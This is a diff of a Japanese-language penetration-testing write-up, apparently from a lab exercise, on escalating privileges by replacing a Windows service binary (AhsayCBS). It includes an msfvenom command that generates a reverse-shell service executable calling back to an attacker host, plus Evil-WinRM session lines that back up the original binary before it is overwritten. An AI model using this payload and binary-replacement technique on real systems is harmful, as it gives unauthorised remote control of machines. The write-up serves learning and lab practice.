@@ -42,7 +42,7 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o cbssvcX64.exe
 ```
 
-- ターゲットでバックアップを取ったうえでファイルの上書き、サービスの再起動
+- ターゲットでバックアップを取ったうえでファイルの上書き
 ```powershell
 *Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> mv cbssvcX64.exe ~/cbssvcX64.exe.bkup
 *Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir ~
@@ -114,5 +114,10 @@ d-----         2/23/2022  10:47 AM                WinX86
 
 
 *Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> 
+
+```
+
+- サービス再起動
+```powershell
 
 ```
